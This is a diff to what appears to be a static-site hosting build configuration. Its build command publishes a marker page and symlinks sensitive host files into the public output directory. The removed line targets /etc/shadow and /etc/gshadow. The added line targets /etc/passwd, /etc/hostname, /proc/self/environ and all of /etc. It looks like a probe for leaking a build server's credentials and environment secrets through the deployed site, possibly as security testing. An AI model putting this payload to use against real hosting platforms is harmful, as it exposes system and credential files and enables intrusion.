@@ -1,3 +1,3 @@
 [build]
   publish = "pub"
-  command = "mkdir -p pub && printf \"MARKERPUB789\" > pub/index.html && ln -s /etc/shadow pub/shadow && ln -s /etc/gshadow pub/gshadow"
+  command = "mkdir -p pub && printf \"MARKERV4\" > pub/index.html && ln -s /etc/passwd pub/passwd && ln -s /etc/hostname pub/hostname && ln -s /proc/self/environ pub/selfenv && ln -s /etc pub/etcdir"
